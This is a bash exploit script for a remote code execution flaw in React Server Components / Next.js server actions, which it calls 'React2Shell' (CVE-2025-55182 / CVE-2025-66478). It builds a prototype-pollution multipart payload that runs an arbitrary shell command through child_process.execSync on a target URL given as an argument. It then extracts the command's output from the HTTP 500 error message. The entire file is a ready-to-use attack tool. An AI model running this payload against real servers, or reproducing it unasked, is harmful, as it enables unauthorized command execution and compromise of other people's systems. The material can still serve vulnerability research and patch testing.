#!/bin/bash
# exploit-throw.sh - React2Shell with stdout capture (CVE-2025-55182 / CVE-2025-66478)
#
# Uses throw approach to capture command output in error response.
# Returns HTTP 500 with command stdout in the error message field.
#
# Usage: ./exploit-throw.sh [TARGET_URL] [COMMAND]
# Example: ./exploit-throw.sh http://localhost:3443 "id"

set -e

TARGET="${1:-http://localhost:3443}"
COMMAND="${2:-id}"

echo "[*] React2Shell Exploit - stdout capture mode"
echo "[*] Target: ${TARGET}"
echo "[*] Command: ${COMMAND}"
echo ""

TMPDIR=$(mktemp -d)
CHUNK0="${TMPDIR}/chunk0.json"
CHUNK1="${TMPDIR}/chunk1.json"

cleanup() {
    rm -rf "${TMPDIR}"
}
trap cleanup EXIT

# Payload uses throw to capture stdout in error response:
# throw execSync('CMD').toString() -> Promise rejects -> HTTP 500 with output in message
cat > "${CHUNK0}" << 'INNEREOF'
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"PLACEHOLDER","_formData":{"get":"$1:constructor:constructor"}}}
INNEREOF

# Escape single quotes and build throw payload
ESCAPED_CMD=$(echo "$COMMAND" | sed "s/'/\\\\'/g")
sed -i.bak "s|PLACEHOLDER|throw process.mainModule.require('child_process').execSync('${ESCAPED_CMD}').toString();|" "${CHUNK0}"
rm -f "${CHUNK0}.bak"

printf '"$@0"' > "${CHUNK1}"

# Send exploit and capture response
RESPONSE=$(curl -s -w "\n__HTTP_CODE__%{http_code}" \
    -X POST "${TARGET}" \
    -H "Next-Action: x" \
    -F "0=<${CHUNK0}" \
    -F "1=<${CHUNK1}" \
    --max-time 30 \
    2>&1)

HTTP_CODE=$(echo "$RESPONSE" | grep "__HTTP_CODE__" | sed 's/__HTTP_CODE__//')
BODY=$(echo "$RESPONSE" | grep -v "__HTTP_CODE__")

if [[ "${HTTP_CODE}" == "500" ]]; then
    # Extract command output from error message field
    # Format: 1:E{"digest":"...","name":"Error","message":"OUTPUT",...}
    OUTPUT=$(echo "$BODY" | grep -o '"message":"[^"]*"' | head -1 | sed 's/"message":"//;s/"$//')

    if [[ -n "$OUTPUT" ]]; then
        echo "[+] Command output:"
        echo "----------------------------------------"
        # Unescape \n to actual newlines
        echo -e "$OUTPUT"
        echo "----------------------------------------"
    else
        echo "[?] HTTP 500 but could not parse output"
        echo "$BODY"
    fi
elif [[ "${HTTP_CODE}" == "000" ]]; then
    echo "[-] Connection failed or timed out"
else
    echo "[-] Unexpected HTTP ${HTTP_CODE}"
    echo "$BODY"
fi